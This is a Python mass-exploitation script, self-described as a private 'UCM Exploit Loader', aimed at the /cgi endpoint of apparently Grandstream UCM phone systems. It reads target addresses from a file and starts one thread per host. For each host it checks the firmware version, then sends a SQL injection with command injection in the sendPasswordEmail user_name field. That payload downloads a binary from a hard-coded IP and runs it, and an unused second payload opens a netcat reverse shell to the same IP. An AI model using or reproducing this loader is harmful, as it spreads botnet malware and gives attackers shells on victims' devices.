import os
import re
import sys
import json
import argparse
import requests
import threading
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# UCM Exploit Loader made by B4CKDOOR - PRIVATE #
# B4CKDOORARCHIVE.CLUB #

#$top_parser = argparse.ArgumentParser(description='')
#$top_parser.add_argument('--rhost', action="store", dest="rhost",
#$required=True, help="The remote host to connect to")
#$top_parser.add_argument('--rport', action="store", dest="rport", type=int,
#$help="The remote port to connect to", default=8089)
#$top_parser.add_argument('--lhost', action="store", dest="lhost",
#$required=True, help="The local host to connect back to")
#$top_parser.add_argument('--lport', action="store", dest="lport", type=int,
#$help="The local port to connect back to", default=1270)
#$args = top_parser.parse_args()


class Loader(object):

    def infect(self, adress: str):
        url = 'https://' + adress + ':' + "8089" + '/cgi'
        print('[+] Sending getInfo request to ', url)

        try:
            resp = requests.post(url=url, data='action=getInfo', verify=False)
        except Exception:
            print('[-] Error connecting to remote target')
            sys.exit(1)
        
        if resp.status_code != 200:
            print('[-] Did not get a 200 OK on getInfo request')
            sys.exit(1)
        
        if resp.text.find('{ "response":') != 0:
            print('[-] Unexpected response')
            sys.exit(1)
        
        try:
            parsed_response = json.loads(resp.text)
        except Exception:
            print('[-] Unable to parse json response')
            sys.exit(1)
        
        print('[+] Remote target info: ')
        print('\t-> Model: ', parsed_response['response']['model_name'])
        print('\t-> Version: ', parsed_response['response']['prog_version'])
        
        match = re.match('^([0-9]+)\.([0-9]+)\.([0-9]+)\.([0-9]+)$',
        parsed_response['response']['prog_version'])
        if not match:
            print('[-] Failed to extract the remote targets version')
            sys.exit(1)
        
        major = int(match[1])
        minor = int(match[2])
        point = int(match[3])
        patch = int(match[4])
        
        if (major > 1) or (major == 1 and minor > 0) or (major == 1 and minor == 0
        and point > 19) or (major == 1 and minor == 0 and point == 19 and patch >=
        20):
            print('[-] Unaffected version')
            sys.exit(1)
        else:
            print('[+] Vulnerable version!')

        print("[+] loaded, %s" %(adress))
        try:
            exploit = "admin\' or 1=1--`;cd /var/; wget http://194.87.138.130/skid.arm6 ; chmod 777 skid.arm6 ; ./skid.arm6 Jaws" #arm7
            exploit2 = 'admin\' or 1=1--`;`nc${IFS}' + "194.87.138.130" + '${IFS}' + "1270" + '${IFS}-e${IFS}/bin/sh`;`'
            resp = requests.post(url=url,
        data='action=sendPasswordEmail&user_name=' + exploit, verify=False)
        except Exception as err:
            print('[-] Failed to send payload')
            sys.exit(1)
        
        if resp.status_code != 200:
            print('[-] Did not get a 200 OK on sendPasswordEmail request')
            sys.exit(1)
        
        try:
            parsed_response = json.loads(resp.text)
        except Exception:
            print('[-] Unable to parse json response')
            sys.exit(1)
        
        if parsed_response['status'] == 0:
            print('[+] Success! Clean exit.')
        else:
            print('[-] Something bad happened.')
            
    def __init__(self, adress: str):
        self.infect(adress)

with open(sys.argv[1], "r") as f:
    for item in f.readlines():
        threading.Thread(target=Loader, args=(item.rstrip(), )).start()